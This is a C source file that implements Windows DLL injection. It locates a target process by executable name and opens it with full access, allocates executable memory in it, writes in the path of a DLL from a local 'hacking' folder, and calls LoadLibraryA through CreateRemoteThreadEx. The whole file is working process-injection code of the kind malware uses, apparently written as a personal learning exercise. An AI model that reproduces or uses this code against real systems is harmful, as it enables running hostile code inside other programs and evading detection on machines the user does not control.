#include "process.h"
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

char shellDLL[MAX_PATH] = "C:\\Users\\lilith\\Desktop\\hacking\\inject.dll";
size_t shellSize = sizeof(shellDLL);

int get_process(HANDLE *hProcess, char *name) {
  HANDLE hProcessSnap;
  PROCESSENTRY32 pe32;
  pe32.dwSize = sizeof(PROCESSENTRY32);

  hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hProcessSnap == INVALID_HANDLE_VALUE) {
    warn("Couldnt create a snapshot. Error: %ld", GetLastError());
    return -1;
  }
  if (!Process32First(hProcessSnap, &pe32)) {
    warn("Error with the Process32First. Error: %ld", GetLastError());
    CloseHandle(hProcessSnap);
    return -1;
  }
  do {
    if (!strcmp(pe32.szExeFile, name)) {
      *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
      if (!*hProcess) {
        warn("Failed to OpenProcess. Error: %ld", GetLastError());
        CloseHandle(hProcessSnap);
        return -1;
      }
      CloseHandle(hProcessSnap);
      return 0;
    }
  } while (Process32Next(hProcessSnap, &pe32));
  CloseHandle(hProcessSnap);
  return -1;
}

int process_inject(HANDLE hProcess) {
  LPVOID shellBuf;
  HANDLE hThread;
  DWORD tID;
  HMODULE hKernel;

  // Allocating space for the shellcode
  shellBuf = VirtualAllocEx(hProcess, NULL, shellSize,
                            (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
  if (!shellBuf) {
    warn("Failed to VirtualallocEx. Error: %ld", GetLastError());
    return -1;
  }
  okey("Created buffer of size %lld", shellSize);

  // Populating that space with the shellcode
  if (!WriteProcessMemory(hProcess, shellBuf, shellDLL, shellSize, NULL)) {
    warn("Failed to WriteProcessMemory. Error: %ld", GetLastError());
    return -1;
  }
  // TODO: the dll stuff
  hKernel = GetModuleHandle("kernel32");
  if (!hKernel) {
    warn("Failed to get Kernel32.dll. Error: %ld", GetLastError());
    return -1;
  }
  info("Got Kernel32 module: %p", hKernel);

  LPTHREAD_START_ROUTINE dllBuf =
      (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel, "LoadLibraryA");
  if(!dllBuf){
    warn("Failed to GetProcAddress. Error: %ld", GetLastError());
    return -1;
  }
  info("Got LoadLibrary library: %p", dllBuf);

  // Create thread
  hThread = CreateRemoteThreadEx(
      hProcess, NULL, 0, dllBuf, shellBuf, 0, 0, &tID);
  if (!hThread) {
    warn("Failed to CreateRemoteThreadEx. Error: %ld", GetLastError());
    return -1;
  }
  okey("Created a thread with the DLL %p", hThread);
  info("The thread id is %ld", tID);

  // Waiting for the thread to stop
  WaitForSingleObject(hThread, INFINITE);

  // Cleanup
  if (hThread) {
    info("Closing the thread");
    CloseHandle(hThread);
  }

  return 0;
}
